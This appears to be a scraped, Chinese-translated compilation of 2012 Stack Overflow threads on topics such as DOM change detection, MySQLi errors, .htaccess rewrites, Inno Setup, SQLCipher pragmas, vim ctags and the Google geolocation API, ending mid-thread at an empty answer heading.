> 赞同：3
> 
> 时间：2012-11-23T23:57:28.170
> 
> 标签：javascript, jquery, dom

是否可以轻松检测用户对 DOM 的操作？

当用户在任何现代浏览器中使用控制台时，他/她可以以开发人员不希望的方式操作 DOM。

我有一个与处于某些状态的 DOM 非常相关的 Web 应用程序，如果用户通过控制台对 DOM 执行任何操作，我希望收到通知。

答案：

1.  不需要与浏览器无关
2.  不需要完美。我完全理解大多数（如果不是全部）方法都可以被规避，但我想要一个好的通用解决方案。
3.  不能太纠结。我对在我的代码执行 DOM 操作时检查某些标志集的所有 DOM 事件注册事件处理程序不感兴趣

**编辑**：

到目前为止，我收到的答案似乎有些混乱。正如上面 #2 中所指出的，我知道大多数（如果不是全部）方法都可以被规避。

此外，这是一个内部工具，因此受 VPN 保护。此外，还有服务器端检查。但是，有一些原因我无法详细说明，因为我想知道用户（数量很少）何时操纵了 DOM。

需要明确的是，这不是出于安全原因。我不是想在这里阻止恶意用户。更多地认为这是出于好奇。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-24T00:09:11.153

不要那样做。将您的网站编码为不信任用户输入，然后不关心用户做什么。如果提交了无效输入，则拒绝它。大家都开心。

很容易认为您拥有用户的浏览器。你没有。它为您服务，但仅在用户的一时兴起。

如果您真的必须知道 DOM 何时被修改——这似乎是一个非常脆弱的设计——那么只需做相当于计算校验和的事情。在站点批准功能的每个合法步骤之后，遍历您关心的 DOM 元素并记录它们的位置、值或您关心的任何内容。每隔一段时间、验证时间或下一次 UI 交互，进行比较。这是检测 DOM 更改的唯一全面的、跨浏览器（包括旧浏览器）的方法。现代浏览器提供 DOM 突变事件（有关更多详细信息，请参阅 Tim Down 的答案），但支持有限，并且显然将被另一个新事物取代，无论如何。

最终，您所做的任何事情都无法阻止决心击败您的计划的人。如果有的话，用户可以使用 Firebug 复制浏览器的 POST 请求，对其进行调整，然后编写一个小程序来提交他自己的恶意 POST 请求。保护您的服务器免受恶意输入比让您的网页防弹（因为它不会）更重要。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-24T00:23:18.433

[DOM 突变事件](https://developer.mozilla.org/en-US/docs/DOM/Mutation_events)在所有主流浏览器的当前版本中都有效，并且可以做你想做的事。以下将涵盖整个文档中常见的 DOM 修改：

```
function handleDomChange(evt) {
    console.log("DOM changed via event of type " + evt.type);
}

document.addEventListener("DOMNodeInserted", handleDomChange, false);
document.addEventListener("DOMNodeRemoved", handleDomChange, false);
document.addEventListener("DOMCharacterDataModified", handleDomChange, false); 
```

DOM 突变事件最终将被[突变观察者](https://developer.mozilla.org/en-US/docs/DOM/MutationObserver)所取代，后者在最近的 Mozilla 和 WebKit 浏览器中实现。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-24T00:01:13.090

依靠脚本来防止或抵消对 DOM 的恶意编辑不是正确的方法。你到底在做什么取决于 DOM 没有被触及？似乎这本身就是一个巨大的危险信号。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-25T01:42:46.707

我收到了很多答案，其中受访者提供了有关如何构建 Web 应用程序的建议。虽然这可能对某些读者有用，但这并不能回答问题。然而，有些人试图回答。我看到的最接近完整答案的是@Keith。唯一的问题是它未能通过“简单”测试。

正如一些人所说，正确的答案似乎是否定的——不可能轻易地检测到用户对 DOM 的操作。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-24T00:45:29.237

这是一个非常有趣的问题，我认为 DOM 突变事件可能是最好的解决方案。我最初认为我可能会做的一件事是运行一个定时函数，它根据数据属性或 ID 检查 DOM 中的特定模块。如果我通过 JS 完全在客户端构建我的页面，我将为每个模块（DOM 元素，如：

```
<div id='weather-widget' data-module-type='widget'>
    <h1 data-module-name='weather'>Weather</h1>
    <!-- etc etc -->
</div> 
```

无论如何，我的配置对象将包含所有这些内容，如模块类型、模块名称等：

```
//Widget configuration object
var weatherWidgetConfig = {
    type: 'widget',
    name: 'weather'
} 
```

我会检查 DOM 元素及其所有子元素，以确保 data- 属性仍然与配置对象匹配，它们存在并且它们没有被更改。如果有，我会使用正确的配置再次调用 module.destroy() 和 module.build()。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-24T00:09:38.783

我最近发现了“ [Selector Listener](https://github.com/csuwldcat/SelectorListener/blob/master/selector-listeners.js) ”，一种依靠 css 检测 DOM 变化的技术。它在 IE 9 中不起作用。将其应用于整个 DOM 听起来不是一个好主意，其目的是使用特定的选择器。

可以在[此博客文章](http://www.backalleycoder.com/2012/08/06/css-selector-listeners/)中找到更多详细信息。

# php - 在类扩展中获取 MySQLi 错误

> ID：13537048
> 
> 赞同：0
> 
> 时间：2012-11-23T23:58:58.577
> 
> 标签：php, mysqli

我有一个扩展 MySQLi 类的自定义数据库类。

`parent`它使用该方法连接到数据库`__construct`。

以下是查询的部分，如果查询不成功，如何从服务器返回错误？

```
$query =  parent::query($querystr, $resultmode);
    if (!$query) {
        $error = str_replace(
            'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use',
            'Syntax Error',
            mysqli_error(self::getInstance()));
        \core\debug::sqlerrorlog($error);
    } else {
        \core\debug::sqlSuccess();
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T00:08:08.987

根据[文档](http://php.net/manual/en/mysqli.error.php)，您只需要这样做`$this->error`。

据我了解，您现在的问题是您没有将正确的 mysqli 实例传递给`mysql_error`- 也许`self::getInstance()`没有做它应该做的事情，但我无法从我所看到的情况中判断出来。

# html - 如何允许用户在我的网站上拖放内容并保存他们的更新？

> ID：13537050
> 
> 赞同：0
> 
> 时间：2012-11-23T23:59:21.850
> 
> 标签：html

如何允许用户在我的网站上拖放内容并保存他们的更新？更详细地说，我正在为人们创建一个应用程序来构建他们的家谱，默认情况下，我的程序按名称对每个家庭成员进行排序，但用户想要自定义他们的家谱，有人知道我该怎么做吗？非常感谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T02:24:28.337

我认为这是您正在寻找的[拖放](http://www.sitepoint.com/html5-file-drag-and-drop/)，

# asp.net - 使用 RowFilter 在字符串中即使没有信号引号也返回相同的结果

> ID：13537051
> 
> 赞同：1
> 
> 时间：2012-11-23T23:59:23.233
> 
> 标签：asp.net, vb.net

我知道我应该像这样在 RowFilter 的字符串之间加上单引号

```
dim TOS as string="04"
rowFilter.RowFilter = "(TOScode= " & "'" & TOS & "')" 
```

我只是想知道为什么下面的代码在没有单引号的情况下仍然有效。

```
 rowFilter.RowFilter = "(TOScode = " & TOS & ") " 
```

TOScode 字段是 SQL 中的 varchar(2) 类型。英语不是我的母语；请原谅打字错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T00:04:18.347

尝试这个

```
rowFilter.RowFilter = String.Format("(TOScode = '{0}')", TOS) 
```

或者简单地说

```
rowFilter.RowFilter = String.Format("TOScode = '{0}'", TOS) 
```

# ajax - 如何使用 Aloha 编辑器编辑动态创建的 dom？

> ID：13537054
> 
> 赞同：1
> 
> 时间：2012-11-23T23:59:45.540
> 
> 标签：ajax, dynamically-generated, aloha-editor

如何让 Aloha Editor 识别和编辑动态创建的 dom/内容？

我通常使用 jquery 并使用 '.live' 或 '.on' 来让它工作，但不知道如何使用 Aloha。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T23:10:47.483

要创建动态 aloha 实例：

```
$(document).ready(function(){
// Add an editable upon clicking on some button Button
$("#Button").click(function () {
    var $ = Aloha.jQuery;
    $('#somewhere').append('<div class="editable" id="ed" ></div>');
    Aloha.jQuery('.editable').mahalo();
    Aloha.jQuery('.editable').aloha();   
}); 
```

现在您可以简单地获取内容：

```
var e = Aloha.getEditableById('ed'); 
getContents(); 
```

我没有测试过它，但它应该可以工作。

# apache - 使用 .htaccess 在一定数量后忽略字符

> ID：13537062
> 
> 赞同：1
> 
> 时间：2012-11-24T00:00:35.370
> 
> 标签：apache, .htaccess

我正在寻找 .htaccess 的代码，它将忽略文件的某些字符。

例如。

我的服务器上有一个名为 file.txt 的文件，网络上的一个链接指向我的文件，但链接是[http://www.myserver.com/file12345.txt](http://www.myserver.com/file12345.txt)

我正在寻找将重写传入链接并忽略前 4 个（文件）之后的所有字符的命令，无论文件中有多少字符。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T03:17:36.310

尝试将此添加到文档根目录中的 htaccess 文件中：

```
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/(.{4})[^.]+\.([a-z]{2,})$
RewriteCond %{DOCUMENT_ROOT}/%1.%2 -f
RewriteRule ^ /%1.%2 [L] 
```

第一个条件确保请求有 4 个字符，然后是至少 1 个不是 a 的其他字符`.`，然后是 a`.`和至少 2 个字符的扩展名。下一个条件检查以确保在前 4 个字符之后删除的内容是否实际指向文件。如果是这样，则进行内部重写。如果您想实际重定向浏览器，`R`请在方括号中添加一个标志。

# xml - XSLT 中 $ 的用途是什么

> ID：13537066
> 
> 赞同：19
> 
> 时间：2012-11-24T00:01:15.193
> 
> 标签：xml, xslt

我正在网上学习 XML 课程，但我不完全确定“$”的用途。

具体来说，这是教科书中的一个块..

```
<xsl:value-of select="key('agentID', $aID)" /> 
```

aID前面的美元符号是我感到困惑的地方。为什么它需要在那里？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-11-24T00:09:22.587

这实际上是一条 XPath 规则——因此它可以用于 XSLT 代码中的任何 XPath 表达式。

**该`$`字符用作 XPath 表达式中变量（或参数）引用中的第一个字符**。

因此：

```
$person 
```

表示：名为 .xsl 的变量或参数`person`。

如果我们只使用：

```
person 
```

**这意味着完全不同的东西**：上下文节点的所有子节点都被命名`person`

在变量引用中忘记`$`变量名之前是 XSLT 程序员最常犯的错误之一。

**对变量或参数使用这样的名称是一种很好的做法，这在视觉上表明命名对象是一个变量/参数**。

例如，我总是在变量`v`名称和参数名称前加上前缀`p`：

```
$vPerson

$pTable 
```

# html - 是否可以将图标添加到 使用 WebKit？

> ID：13537070
> 
> 赞同：4
> 
> 时间：2012-11-24T00:01:32.340
> 
> 标签：html, css, macos, webview

我正在使用我的一个程序内部，并且我正在呈现的 HTML 页面`WebView`中有一个标签。`<select>`我想为`<option>`它包含的元素添加图标，如下所示：

![带有图标的下拉列表的屏幕截图](../Images/4ee409ca95f4f23aa52880134cb76832.png)

（阴影效果不存在，因此很容易忽略这是一个下拉列表；但它确实存在。）

那可能吗？`<option>`到目前为止，我所有设置标签样式或将图像放入其中的努力都失败了。

由于它永远不会被另一个渲染引擎显示，我只需要它与 WebKit 一起工作。我对涉及 WebView 诡计的解决方案也很好，而且它永远不会在浏览器中工作，尽管如果它也能在浏览器中工作，它会有点整洁。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T05:15:51.360

这在目前仅使用 css 的 webkit 浏览器中是不可能的。在 Firefox 中可以，但在 webkit 中不行。

您将需要使用 javascript 将选择框替换为可设置样式的元素。

以下帖子回答了这个问题：
[如何在选择列表中添加图像](https://stackoverflow.com/questions/2965971/how-to-add-a-images-in-select-list#2966006)

# inno-setup - Inno Setup - 如何在安装开始前复制文件？

> ID：13537071
> 
> 赞同：9
> 
> 时间：2012-11-24T00:01:40.267
> 
> 标签：inno-setup

我需要在 Inno Setup 启动之前或“选择目录”页面之前将文件复制到一个文件夹。我希望从安装程序而不是从外部源复制此文件。

我正在使用这段代码：

```
function NextButtonClick(PageID: Integer): Boolean;
begin
  Result := True;
  if (PageId = wpWelcome) then
  begin
    FileCopy(
      ExpandConstant('file.exe'),
      ExpandConstant('{reg:HKCU\SOFTWARE\XXX,InstallPath}\file.exe'), false);
  end;
end; 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-24T10:43:43.173

要在需要时从安装存档中提取文件，您必须使用[`ExtractTemporaryFile`](http://jrsoftware.org/ishelp/topic_isxfunc_extracttemporaryfile.htm)程序。此过程将文件从该[`[Files]`](http://jrsoftware.org/ishelp/topic_filessection.htm)部分提取到安装应用程序使用的临时目录，您可以在[`{tmp}`](http://jrsoftware.org/ishelp/topic_consts.htm#tmp)常量指定的路径上找到该目录。然后，您只需通过扩展上述常量，将提取的文件从那里复制到目标目录。

如果您想在初始化设置时但在创建向导表单之前执行某些操作，请使用[`InitializeSetup`](http://jrsoftware.org/ishelp/topic_scriptevents.htm#InitializeSetup)事件函数。请注意，您甚至可以在不查看向导表单的情况下退出该功能的设置，例如，如果您要复制的文件非常重要。这是一个示例代码，但首先看一下[`commented version`](https://stackoverflow.com/revisions/13540439/1)它的一些细节：

```
[Code]
function InitializeSetup: Boolean;
begin
  Result := True;
  ExtractTemporaryFile('File.exe');
  if FileCopy(ExpandConstant('{tmp}\File.exe'), 
    ExpandConstant('{reg:HKCU\SOFTWARE\XXX,InstallPath}\File.exe'), False) 
  then
    MsgBox('File copying succeeded!', mbInformation, MB_OK)
  else
    MsgBox('File copying failed!', mbError, MB_OK)  
end; 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-24T02:40:16.670

您需要先将文件提取到临时目录，然后将其复制到您想要的位置。像这样的东西应该工作：

```
; Script generated by the Inno Setup Script Wizard.
; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!

#define MyAppName "My Program"
#define MyAppVersion "1.5"
#define MyAppPublisher "My Company, Inc."
#define MyAppURL "http://www.example.com/"
#define MyAppExeName "MyProg.exe"

[Setup]
; NOTE: The value of AppId uniquely identifies this application.
; Do not use the same AppId value in installers for other applications.
; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)
AppId={{5820E516-8DD7-4481-A016-63D3F00438C8}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
;AppVerName={#MyAppName} {#MyAppVersion}
AppPublisher={#MyAppPublisher}
AppPublisherURL={#MyAppURL}
AppSupportURL={#MyAppURL}
AppUpdatesURL={#MyAppURL}
DefaultDirName={pf}\{#MyAppName}
DefaultGroupName={#MyAppName}
OutputBaseFilename=setup
Compression=lzma
SolidCompression=yes

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked

[Files]
Source: "C:\Program Files (x86)\Inno Setup 5\Examples\MyProg.exe"; DestDir: "{app}"; Flags: ignoreversion
; NOTE: Don't use "Flags: ignoreversion" on any shared system files

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"
Name: "{commondesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Tasks: desktopicon

[Run]
Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, "&", "&&")}}"; Flags: nowait postinstall skipifsilent

[Code]
function InitializeSetup: Boolean;
var
  S: AnsiString;
begin
  // Show the contents of Readme.txt (non Unicode) in a message box
  log('Before Extract');
  ExtractTemporaryFile('myprog.exe');
  log('Before FileCopy. Dest:' + ExpandConstant('{reg:HKCU\SOFTWARE\XXX,InstallPath}\file.exe'));
  log('temp: ' + ExpandConstant('{tmp}\myprog.exe'));
  FileCopy(ExpandConstant('{tmp}\myprog.exe'), ExpandConstant('{reg:HKCU\SOFTWARE\XXX,InstallPath}\file.exe'), false);
  log('After FileCopy');
  Result := True;
end; 
```

# android - Android SQLcipher PRAGMA 问题

> ID：13537073
> 
> 赞同：1
> 
> 时间：2012-11-24T00:01:48.380
> 
> 标签：android, pragma, sqlcipher

嘿伙计们，我在使用 SQLcipher db for android 时遇到了一些问题，文档描述性不太强，所以我无法弄清楚。

我正在尝试修改 sqlcipher for android 的默认迭代次数，我正在编辑作为演示应用程序提供的 notecipher 应用程序，并希望将 kdf_iter 增加到 5000

通过覆盖数据库帮助程序中的 getWritableDatabase() 方法，我在使用密码打开文件后输入编译指示值。

我可以打开并初始化数据库，但如果我调用 database.close()，我将无法重新打开数据库。

每当我在下一次 open() 调用中关闭数据库时，我都会得到：

```
I/Database(807): sqlite returned: error code = 26, msg = file is encrypted or is not a database
E/Database(807): CREATE TABLE android_metadata failed
E/Database(807): Failed to setLocale() when constructing, closing the database
E/Database(807): info.guardianproject.database.sqlcipher.SQLiteException: file is encrypted or is not a database 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T18:19:27.230

You'll want to use a SQLiteDatabaseHook object to call the kdf_iter pragma. This will ensure that the pragma is called immediately after the database is opened, but before it is used.

```
SQLiteDatabaseHook hook = new SQLiteDatabaseHook(){
  public void preKey(SQLiteDatabase database){
    database.rawExecSQL("PRAGMA kdf_iter = 5000");
  }
  public void postKey(SQLiteDatabase database){}
}

SQLiteDatabase database = SQLiteDatabase.openOrCreateDatabase(databasePath, password, null, hook); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-11-09T14:32:14.777

@Stephen 的回答只是部分正确，因为根据[文档](https://www.zetetic.net/sqlcipher/sqlcipher-api/#kdf_iter)：

> PRAGMA kdf_iter 必须**在**PRAGMA 键之后和第一次实际数据库操作之前调用，否则它将不起作用。

所以这一行：

> database.rawExecSQL("PRAGMA kdf_iter = 5000");

必须插入 postKey() 方法，而不是 preKey()。
这对我有用。

# c++ - 程序在 Visual Studio 中启动时看不到文件

> ID：13537085
> 
> 赞同：0
> 
> 时间：2012-11-24T00:05:26.633
> 
> 标签：c++, visual-studio-2010, opencv

我有这段代码：

```
int main()
{
    string file = "stuff.jpg";

    Mat img = imread(file);
    if (img.empty())
    {
        printf("EMPTY");
        system("PAUSE");
        return -1;
    }
    imshow("display", img );

    waitKey(0);
    return 0;
} 
```

当我以可视方式启动该程序时，我发现 img 是空的，但是如果我从命令行运行或只需双击，它就可以正常工作。当我在可视化和命令行中运行它时，顶部的路径是相同的。这是为什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T00:08:45.863

从 Visual Studio 运行时的工作目录由项目属性控制：

```
Configuration Properties | Debugging | Working Directory 
```

适当设置或指定完整的绝对路径，而不仅仅是`"stuff.jpg"`文件名。

# javascript - 在 JavaScript 警报中显示超过 10,000 个字符

> ID：13537086
> 
> 赞同：3
> 
> 时间：2012-11-24T00:05:30.783
> 
> 标签：javascript

> **可能重复：**
> [javascript 对象最大大小限制为 10000 个字符](https://stackoverflow.com/questions/5927647/javascript-object-max-size-limit-at-10000-chars)

我想检查 html 源是否包含指定的字符串，但我只得到 10,000 个字符（在警告框中）

```
var str=document.documentElement.innerHTML;
if(str.indexOf("abcxyz") !== -1)
{
  alert(str);
} 
```

我该如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T00:29:16.307

如果您需要在警报框中显示一个巨大的字符串，我想您可以将其拆分为 10,000 个字符的块并按顺序显示。或者，只需使用[`console.log`](http://msdn.microsoft.com/en-us/library/dd565625%28v=vs.85%29.aspx#consolelogging)打印出来。

> 有没有更好的方法来检测“onClick”事件？

比什么好？JavaScript 事件将冒泡到包含元素的顶部（除非链中的某些元素调用`stopPropagation()`），因此检测点击事件的一种简单方法是将点击处理程序附加到`document.body`：

```
document.body.onclick = function() { alert('Click!'); } 
```

# c# - 不允许主机连接到这个 MySql 服务器

> ID：13537089
> 
> 赞同：2
> 
> 时间：2012-11-24T00:06:03.920
> 
> 标签：c#, asp.net, mysql

我无法远程连接到我的服务器。

*   我尝试将绑定地址更改为 IP 地址。
*   我尝试将绑定更改为 0.0.0.0
*   我已确保端口 3306 未被防火墙阻止
*   我已经从请求的 IP 和端口添加了一个特权用户，并授予该用户完全访问权限。

上述更改似乎都没有奏效。

我用于连接字符串的语法是 Server=;Database=dbname;Uid=userid;Pwd=pwd;

数据库是使用 Xammp phpyadmin 建立的

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T01:20:22.780

您可能需要让您的用户名远程访问数据库。我忘记了确切的步骤，但我知道它在您最初设置帐户以及编辑它时位于用户帐户选项下。确保用户可以从所有主机连接，而不仅仅是本地主机。

# vim - VIM - 从项目中的多个位置采购标签

> ID：13537090
> 
> 赞同：5
> 
> 时间：2012-11-24T00:06:07.337
> 
> 标签：vim, vi, ctags, code-completion, omnicomplete

再会，

我通常处理相对较小（少于 20,000 行代码）的项目，这些项目都包含在一个目录中，有自己的 Makefile，并且相当容易使用。

VIM 是我首选的编辑器，当我打开一个项目时，我通常通过映射到`F10`键来构建 ctags 列表：

```
map <F10> :!ctags -R --c++-kinds=+p --fields=+iaS --extra=+q .<CR> 
```

`CTRL`这允许我通过将光标移动到文本上并点击+`]`以及通过 OmniCppComplete 使用带有下拉列表的代码完成来跳转到变量/结构/等的定义。

然而，我现在正在做一个稍微大一点的项目，它利用了很多结构。此外，其中许多结构都有其他自定义结构的数组作为成员，因此代码完成现在对我来说是一个非常有用和重要的工具。

我有两个包含大量`.C`文件和`.h`文件的路径，它们可能会因机器而异。然而，在每台机器上，我们的`.bashrc`文件中都有一个环境变量指向它们，如下所示：

```
SDK_SRC_PLUS_HEADERS=/public/sdk
THIRD_PARTY_SDK=/private/sdk 
```

我希望能够让 VIM 在我尝试执行代码完成时自动引用这些附加路径的内容（通过 VIM 的内置 OmniCppComplete 功能），或者当我在 VIM 中使用`CTRL`+时跳转到这些位置的文件`]`跳转到结构、函数、变量等的定义。

因此，对于上述两种路径，我`cd`都进入了它们，并通过`ctags -R`. 然后，我修改了我的`~/.vimrc`文件以包含其他标签路径，如下所示：

```
tags=./tags
tags+=$SDK_SRC_PLUS_HEADERS/tags
tags+=$THIRD_PARTY_SDK/tags 
```

然后`cd`我进入我的项目`/home/user1/projects/test`，启动 VIM，然后`F10`在 VIM 中对其进行索引。但是，这根本不起作用。事实上，它破坏了我甚至只为项目本身使用标签的能力（即：`CTRL`+`]`现在什么都不做）。

有没有人对我如何通过环境变量使用多个源目录来获得代码完成源标签和跳转到定义有任何建议？

提前感谢大家的时间和帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T17:30:50.427

我想添加到@sehe 提供的解决方案中。

这是我对我的`.vimrc`. 第一行用于向我的变量添加扩展的环境变量路径`tags`。另一个用于在我必须更新我的 SDK 并且不想意外使用过期标签的情况下自动更新标签：

```
" CTAGS tag generation for OmniCppComplete
set tags+=./tags
exec expand("set tags+=$SDK_SRC_PLUS_HEADERS/tags")
exec expand("set tags+=$THIRD_PARTY_SDK/tags")
" Can verify taglist is correct via ":set verbose tags?" command

" Create a mapping to delete the old tags, re-generate them, and use them
map <F10> :!ctags -R --c++-kinds=+p --fields=+iaS --extra=+q . \| rm -f $SDK_SRC_PLUS_HEADERS/tags \| ctags -R -f $SDK_SRC_PLUS_HEADERS/tags $SDK_SRC_PLUS_HEADERS/tags  \| rm -f $THIRD_PARTY_SDK/tags \| ctags -R -f $THIRD_PARTY_SDK/tags $THIRD_PARTY_SDK/tags  \| echo "Done re-generating tags."<CR> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T00:40:12.970

确实似乎是您不能在标签设置中使用环境变量的问题。

我想出了一个解决方法：

```
:let &tags.=expand(",$SDK_SRC_PLUS_HEADERS/tags") 
```

这可能会更友好一些：

```
:exec expand("set tags+=$SDK_SRC_PLUS_HEADERS/tags") 
```

# jquery - 使用带有 jquery 的谷歌地图地理定位 api（wifi 查找）

> ID：13537091
> 
> 赞同：0
> 
> 时间：2012-11-24T00:06:45.120
> 
> 标签：jquery, google-maps, geolocation

我想我会尝试一下谷歌的新地理定位 API，它可以根据 wifi 信号为您提供您的位置。

我使用 jquery 编写了这个简短的 JS 代码

```
function testmoj() {
console.log("testmojjs");

var wifiP = [
  {
  "macAddress": "00:26:f2:f7:a7:6b",
  "signalToNoiseRatio": -57
  },
  {
  "macAddress": "58:98:35:57:b8:db",
  "signalToNoiseRatio": -68
  },
  {
  "macAddress": "58:98:35:3c:3b:c9",
  "signalToNoiseRatio": -67
  },
  {
  "macAddress": "00:26:f2:f7:a7:6d",
  "signalToNoiseRatio": -80
  },
  {
  "macAddress": "70:56:81:ca:63:6f",
  "signalToNoiseRatio": -83
  },
  {
  "macAddress": "00:22:3f:0f:84:11",
  "signalToNoiseRatio": -85
  },
  {
  "macAddress": "58:98:35:3a:9f:01",
  "signalToNoiseRatio": -83
  },
  {
  "macAddress": "58:98:35:55:6b:4f",
  "signalToNoiseRatio": -94
  },
  {
  "macAddress": "00:24:17:d5:a7:83",
  "signalToNoiseRatio": -84
  },
  {
  "macAddress": "58:98:35:57:c5:fb",
  "signalToNoiseRatio": -91
  }
 ];

$.ajax({
    type: 'post',
    dataType: 'json',
    contentType: 'application/json',
    url: 'https://www.googleapis.com/geolocation/v1/geolocate?key=MyKeyIsNormallyHere:-)',
    data: { "wifiAccessPoints": wifiP },
    success: function (response) {
        console.log("wooooooooooooooooooooooooooooooooooooooooooo");
        console.log(response);
    },
    error: function () {
        console.log("faaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaail");
    }
});
} 
```

但我得到的总是（错误函数运行）：

```
{
"error": {
"errors": [
{
"domain": "global",
"reason": "parseError",
"message": "Parse Error"
}
], 
"code": 400,
"message": "Parse Error"
}
} 
```

我根本看不到我在这里做错了什么，有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T23:11:41.963

我仍然不确定为什么 javascript 代码不起作用，但我将它从服务器端移到了 .net 上，然后它就起作用了。对于任何想在这里使用它的人来说，这是一个howto。这只是一个快速测试代码，里面还有很多废话！

我也有一段时间得到 403，因为我忘记在我的谷歌开发者控制台/api 控制台中启用它。只需仔细按照 google maps geolocation api's page 上的说明进行操作

```
 public ActionResult FindLocationForWifi()
    {
        Models.WifiAPInformation apInfo = new Models.WifiAPInformation();

        apInfo.wifiAccessPoints.Add(new Models.WifiAP("00:26:f2:f7:a7:6b", -57));
        apInfo.wifiAccessPoints.Add(new Models.WifiAP("58:98:35:57:b8:db", -68));
        apInfo.wifiAccessPoints.Add(new Models.WifiAP("58:98:35:3c:3b:c9", -67));
        apInfo.wifiAccessPoints.Add(new Models.WifiAP("00:26:f2:f7:a7:6d", -80));
        apInfo.wifiAccessPoints.Add(new Models.WifiAP("70:56:81:ca:63:6f", -83));
        apInfo.wifiAccessPoints.Add(new Models.WifiAP("00:22:3f:0f:84:11", -85));
        apInfo.wifiAccessPoints.Add(new Models.WifiAP("58:98:35:3a:9f:01", -83));
        apInfo.wifiAccessPoints.Add(new Models.WifiAP("58:98:35:55:6b:4f", -94));
        apInfo.wifiAccessPoints.Add(new Models.WifiAP("00:24:17:d5:a7:83", -84));
        apInfo.wifiAccessPoints.Add(new Models.WifiAP("58:98:35:57:c5:fb", -91));

        String url = "https://www.googleapis.com/geolocation/v1/geolocate?key=" + BlogConfiguration.Instance.Frontend.ApiKeys.GoogleMaps.Key;

        var json = new JavaScriptSerializer().Serialize(apInfo);
        var bytes = Encoding.Default.GetBytes(json);

        //return Content(json);

        try
        {

            using (var client = new WebClient())
            {
                client.Headers.Add("Content-Type", "application/json");
                var response = client.UploadData(url, "POST", bytes);

                return Content(Encoding.Default.GetString(response));
            }
        }
        catch (WebException wex)
        {
            if (wex.Response != null)
            {
                System.Diagnostics.Debug.WriteLine("Url: " + Url);
                String Resp = new StreamReader(wex.Response.GetResponseStream()).ReadToEnd();
                System.Diagnostics.Debug.WriteLine(Resp);
            }
            else
                throw;
        }

        //return Json(apInfo, JsonRequestBehavior.AllowGet);
        return Content(url);
    }
} 
```

你需要这些课程

```
namespace Frontend.Models
{
public class WifiAPInformation
{
    public List<WifiAP> wifiAccessPoints; //according to google name standard for location api

    public WifiAPInformation()
    {
        wifiAccessPoints = new List<WifiAP>();
    }
}

public class WifiAP
{
    public String macAddress; //starting small letter because of standard in google maps geolocation api
    public int signalStrength;

    public WifiAP(String mac, int signal)
    {
        macAddress = mac;
        signalStrength = signal;
    }
}
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-10-08T19:45:41.670

对于测试，使用以下代码创建文件 test.html（将 GoogleAPIKeyHere 替换为您的 Google API 位置密钥）：

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
function sendSurroundingWifis() {
    console.log("sendSurroundingWifis");
    var wifis = '{"wifiAccessPoints":[' +
        '{"macAddress":"00:26:f2:f7:a7:6b","signalStrength":-68},' +
        '{"macAddress":"58:98:35:57:b8:db","signalStrength": -88},' +
        '{"macAddress":"58:98:35:3c:3b:c9","signalStrength": -90}]}';
    $.ajax({
        type: 'post',
        dataType: 'json',
        contentType: 'application/json',
        url: 'https://www.googleapis.com/geolocation/v1/geolocate?key=GoogleAPIKeyHere',
        data: wifis,
        success: function (response) {
            console.log("Working!");
            console.log(response);
            $('#content').html('<a href="http://www.google.com/maps/place/'+response.location.lat+','+response.location.lng+'">Show on google maps</a>');
        },
        error: function () {
            console.log("FAIL!");
        }
    });
}
</script>

<button onclick="sendSurroundingWifis()">sendSurroundingWifis</button> <br>
<div id="content">...</div> 
```

# jquery - 删除 TD 元素的 img 标签并同时更改样式的 bgcolor 标签值

> ID：13537093
> 
> 赞同：0
> 
> 时间：2012-11-24T00:07:14.683
> 
> 标签：jquery, html, replace, tags

我在这样的几个页面中有以下代码。

```
<td bgcolor="#017842" height="4"><img src="images/pix.gif" border="0" width="1" height="1" /></td> 
```

并将替换

```
<td height="4" style="line-height: 4px; background-color:#017842;"></td> 
```

实际上看到它不同，我需要对于每个具有 IMG SRC 值的 img 标签 = 'images/pix.gif' 删除父元素，但在添加到父元素的样式属性 line-height 类型之前..

我尝试使用此处发布的解决方案 [Using jQuery each to replace image source](https://stackoverflow.com/questions/5242258/using-jquery-each-to-replace-image-source)

但我无法解决...

如果你理解得很好，我希望我解释正确。

谢谢！

* * *

## 回答 #1

> 赞同：2
